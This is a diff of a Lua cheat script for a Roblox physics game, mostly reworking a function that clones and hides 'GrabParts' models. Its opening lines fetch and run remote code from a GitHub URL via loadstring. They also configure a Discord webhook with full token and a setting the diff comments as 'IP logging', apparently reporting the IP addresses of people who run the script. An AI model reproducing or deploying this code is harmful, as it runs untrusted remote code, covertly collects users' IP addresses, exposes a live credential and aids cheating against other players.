@@ -2,8 +2,8 @@ local ApiFTAP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoe
 
 ApiFTAP:SetSettings({
     NameHub = "Kobra",
-    WebhookEnabled = true,
-    ExecuteLogSecret = true,
+    WebhookEnabled = true, -- Enable/Disable
+    ExecuteLogSecret = true, -- IP logging
     WebhookLink = "https://discord.com/api/webhooks/1364446921791508480/QAEuLmPSu1addaZY1gI3ljXlV6fmSZq1gmvHmRN81nIjTIjKfzOJpBMXnOOA5SLaSBC5"
 })
 -- SetSettings(settings: table)
@@ -391,34 +391,69 @@ local function createMenu()
     keybindsTitle.Parent = keybindsTab
 
 local function createAnchor()
+    local existing = workspace:FindFirstChild("CleanedGrabParts")
+    if existing then
+        existing:Destroy()
+        return
+    end
+
     local originalModel = workspace:FindFirstChild("GrabParts")
     if not originalModel then return end
 
-    -- Клонируем модель
-    local cleanedModel = originalModel:Clone()
-    cleanedModel.Name = "CleanedGrabParts"
+    -- включаем коллизию для проверки касаний
+    for _, part in ipairs(originalModel:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = true
+        end
+    end
 
-    -- Очищаем клон от ненужного
-    for _, v in ipairs(cleanedModel:GetDescendants()) do
-        if v.Name == "GrabPart" or v.Name == "DragPart" then
-            local soundsToRemove = {"AttachSound1", "AttachSound", "BeamSound", "BeamSound1"}
-            for _, soundName in ipairs(soundsToRemove) do
-                local sound = v:FindFirstChild(soundName)
-                if sound then
-                    sound:Destroy()
-                end
-            end
-            v.Transparency = 1
+    wait() -- ждём кадр, чтобы коллизии обновились
 
-        elseif v.Name == "BeamPart" then
-            local grabBeam = v:FindFirstChild("GrabBeam")
-            if grabBeam then
-                grabBeam:Destroy()
+    -- собираем касающиеся части
+    local touchParts = {}
+    for _, part in ipairs(originalModel:GetDescendants()) do
+        if part:IsA("BasePart") then
+            for _, hit in ipairs(part:GetTouchingParts()) do
+                table.insert(touchParts, hit)
             end
         end
     end
 
-    -- Помещаем очищенный клон в workspace
+    -- отключаем коллизию обратно
+    for _, part in ipairs(originalModel:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = false
+        end
+    end
+
+    if #touchParts == 0 then return end
+
+    -- клонируем и очищаем модель
+    local cleanedModel = originalModel:Clone()
+    cleanedModel.Name = "CleanedGrabParts"
+    for _, v in ipairs(cleanedModel:GetDescendants()) do
+        if v.Name == "GrabPart" or v.Name == "DragPart" then
+            for _, soundName in ipairs({"AttachSound1","AttachSound","BeamSound","BeamSound1"}) do
+                local s = v:FindFirstChild(soundName)
+                if s then s:Destroy() end
+            end
+            v.Transparency = 1
+        elseif v.Name == "BeamPart" then
+            local b = v:FindFirstChild("GrabBeam")
+            if b then b:Destroy() end
+        end
+    end
+
+    -- позиционируем на первое касание
+    local firstHit = touchParts[1]
+    cleanedModel:PivotTo(firstHit.CFrame)
+
+    -- добавляем тёмно-синий Highlight
+    local highlight = Instance.new("Highlight")
+    highlight.FillColor = Color3.fromRGB(0, 0, 80)
+    highlight.OutlineTransparency = 1
+    highlight.Parent = cleanedModel
+
     cleanedModel.Parent = workspace
 end
 
